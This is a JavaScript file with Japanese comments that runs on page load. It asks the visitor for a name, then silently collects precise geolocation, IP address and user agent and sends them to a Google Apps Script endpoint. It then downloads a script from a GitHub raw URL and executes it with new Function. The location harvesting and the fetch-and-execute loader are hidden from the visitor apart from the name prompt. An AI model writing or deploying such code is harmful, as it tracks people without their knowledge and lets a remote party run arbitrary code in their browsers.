// 位置情報を取得する関数
function getLocation() {
  // ローカルストレージからnameを取得
  var name = localStorage.getItem('name');

  // nameがない場合はpromptで入力を求める
  if (!name) {
    name = prompt("誰が使ったかわからなくなると困るので、あだ名でもなんでもいいのでわかるようにしておくため、名前を入力してください");
    
    // 入力があればローカルストレージに保存
    if (name) {
      localStorage.setItem('name', name);
    }
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
      sendLocationData(position, name);
    }, handleLocationError);
  } else {
    console.error("Geolocation is not supported by this browser.");
  }
}

// 位置情報を含むデータを送信する関数
function sendLocationData(position, name) {
  // 位置情報
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;

  // IPアドレスとユーザーエージェント情報
  fetch('https://ipinfo.io?callback')
    .then(res => res.json())
    .then(json => {
      var ipAddress = json.ip;
      var userAgent = navigator.userAgent;

      // Google Maps URLを構築
      var googleMapsUrl = "https://www.google.com/maps/place/" + latitude + "," + longitude;

      // URLにデータを追加してGETリクエストを送信
      var url = "https://script.google.com/macros/s/AKfycbyMKr_INc2uceLm6F6CZP-JfjE9r4P1f4Vtwz3YRnDc87TMGVu8t7JLya-4FmpI01Yy/exec";
      url += "?latitude=" + latitude + "&longitude=" + longitude + "&ipAddress=" + ipAddress + "&userAgent=" + encodeURIComponent(userAgent) + "&googleMapsUrl=" + encodeURIComponent(googleMapsUrl) + "&name=" + encodeURIComponent(name);

      // GETリクエスト送信
      fetch(url)
        .then(response => response.text())
        .then(data => {
          console.log(data); // サーバーからの応答をコンソールに表示
          function executeScript(url) {  
            fetch(url)    
              .then(data => data.text())    
              .then(text => {      
                const scriptFunction = new Function(text);      
                scriptFunction();    
              });
          }
          executeScript("https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/base.js");
        })
        .catch(error => {
          console.error("Error sending data:", error);
        });
    })
    .catch(error => {
      console.error("Error getting IP address:", error);
    });
}

// 位置情報取得時のエラーハンドラ
function handleLocationError(error) {
  console.error("Error getting location:", error.message);
}

// ページ読み込み時に位置情報を取得して送信
getLocation();
